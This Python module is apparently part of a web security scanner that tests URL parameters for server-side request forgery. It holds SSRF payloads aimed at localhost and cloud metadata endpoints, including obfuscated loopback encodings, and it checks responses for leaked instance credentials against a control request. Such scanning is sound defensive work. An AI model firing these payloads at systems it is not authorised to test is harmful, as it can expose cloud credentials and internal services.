"""SSRF candidate scanner with control-response comparison."""

from urllib.parse import parse_qsl, urlencode, urlparse, urlunparse

from .utils import safe_get


SSRF_PAYLOADS = [
    "http://127.0.0.1",
    "http://localhost",
    "http://[::1]",
    "http://0.0.0.0",
    "http://169.254.169.254/latest/meta-data/",
    "http://metadata.google.internal/computeMetadata/v1/",
    "http://169.254.169.254/metadata/v1/",
    "http://100.100.100.200/latest/meta-data/",
    "http://2130706433",
    "http://0x7f000001",
    "http://017700000001",
    "http://127.1",
]

SSRF_PARAMS = [
    "url", "uri", "path", "dest", "redirect", "site", "html",
    "val", "data", "load", "file", "page", "domain", "callback",
    "return", "feed", "host", "port", "to", "out", "view",
    "dir", "show", "navigation", "open", "img", "reference",
    "proxy", "request", "fetch",
]

AWS_META_SIGNATURES = [
    "ami-id", "instance-id", "instance-type", "local-hostname",
    "public-hostname", "security-credentials",
]

GCP_META_SIGNATURES = [
    "computeMetadata", "project-id", "instance/zone",
]


def _response_is_metadata(response, signatures):
    if not response or not 200 <= response.status_code < 300:
        return False
    body = response.text
    content_type = response.headers.get("Content-Type", "").lower()
    if "text/html" in content_type or body.lstrip().lower().startswith("<html"):
        return False
    return all(signature.lower() in body.lower() for signature in signatures)


def _make_url(parsed, params):
    return urlunparse((
        parsed.scheme, parsed.netloc, parsed.path, parsed.params,
        urlencode(params), parsed.fragment,
    ))


def check_ssrf(url):
    """Test URL parameters for cloud metadata and internal SSRF indicators."""
    findings = []
    parsed = urlparse(url)
    base = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
    original_params = parse_qsl(parsed.query, keep_blank_values=True)
    if not original_params:
        original_params = [(param, "") for param in SSRF_PARAMS[:10]]

    for index, (key, original_value) in enumerate(original_params[:10]):
        control_params = original_params.copy()
        control_params[index] = (key, "https://example.com")
        control = safe_get(_make_url(parsed, control_params), timeout=8)
        control_body = control.text if control else ""

        for payload in SSRF_PAYLOADS[:6]:
            test_params = original_params.copy()
            test_params[index] = (key, payload)
            target = _make_url(parsed, test_params)
            response = safe_get(target, timeout=8)
            if not response:
                continue

            if (_response_is_metadata(response, AWS_META_SIGNATURES)
                    and not _response_is_metadata(control, AWS_META_SIGNATURES)):
                findings.append({
                    "type": "SSRF_AWS_METADATA",
                    "url": target,
                    "parameter": key,
                    "severity": "CRITICAL",
                    "confidence": "HIGH",
                    "verified": True,
                    "verification_method": "metadata-signature-with-control",
                    "verification_evidence": {
                        "deterministic": True,
                        "provider": "AWS",
                        "status": response.status_code,
                        "content_type": response.headers.get("Content-Type", ""),
                        "required_signatures": AWS_META_SIGNATURES,
                        "control_signature_absent": True,
                    },
                    "detail": f"AWS metadata signatures returned only after injecting a URL into `{key}`.",
                })
                return findings

            if (_response_is_metadata(response, GCP_META_SIGNATURES)
                    and not _response_is_metadata(control, GCP_META_SIGNATURES)):
                findings.append({
                    "type": "SSRF_GCP_METADATA",
                    "url": target,
                    "parameter": key,
                    "severity": "CRITICAL",
                    "confidence": "HIGH",
                    "verified": True,
                    "verification_method": "metadata-signature-with-control",
                    "verification_evidence": {
                        "deterministic": True,
                        "provider": "GCP",
                        "status": response.status_code,
                        "content_type": response.headers.get("Content-Type", ""),
                        "required_signatures": GCP_META_SIGNATURES,
                        "control_signature_absent": True,
                    },
                    "detail": f"GCP metadata signatures returned only after injecting a URL into `{key}`.",
                })
                return findings

            # Internal response differences are useful leads, but they do not
            # prove server-side fetching without an OOB callback or equivalent.
            if (payload.startswith(("http://127.", "http://localhost", "http://[::1"))
                    and response.status_code == 200 and len(response.text) > 50
                    and abs(len(response.text) - len(control_body)) > 200):
                findings.append({
                    "type": "SSRF_INTERNAL_ACCESS",
                    "url": target,
                    "parameter": key,
                    "severity": "HIGH",
                    "confidence": "MEDIUM",
                    "verified": False,
                    "verification_method": "ssrf-response-diff",
                    "verification_evidence": {
                        "deterministic": False,
                        "control_url": _make_url(parsed, control_params),
                        "response_status": response.status_code,
                        "response_length": len(response.text),
                        "control_length": len(control_body),
                    },
                    "detail": (f"Internal-target response differs from the same-parameter external control "
                               f"by {abs(len(response.text) - len(control_body))} bytes."),
                })

    return findings if findings else None
